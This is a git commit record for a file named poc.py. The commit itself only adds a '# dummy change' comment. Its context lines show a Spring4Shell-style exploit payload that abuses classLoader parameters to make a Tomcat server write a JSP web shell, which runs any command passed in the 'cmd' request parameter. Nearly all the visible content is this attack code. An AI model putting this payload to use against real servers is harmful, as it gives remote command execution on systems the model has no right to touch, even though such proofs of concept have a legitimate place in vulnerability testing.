fee150b7b7cbc989faeaa58325d498cdf20c7a65
Duarte Duarte <dnpd.dd@gmail.com>
2023-04-18 14:57:19 +0100

    Update poc.py

--- poc.py
+++ poc.py
@@ -2,6 +2,8 @@ import time
 
 import requests
 
+# dummy change
+
 payload = {
     "class.module.classLoader.resources.context.parent.pipeline.first.pattern": '%{c2}i { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
     "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
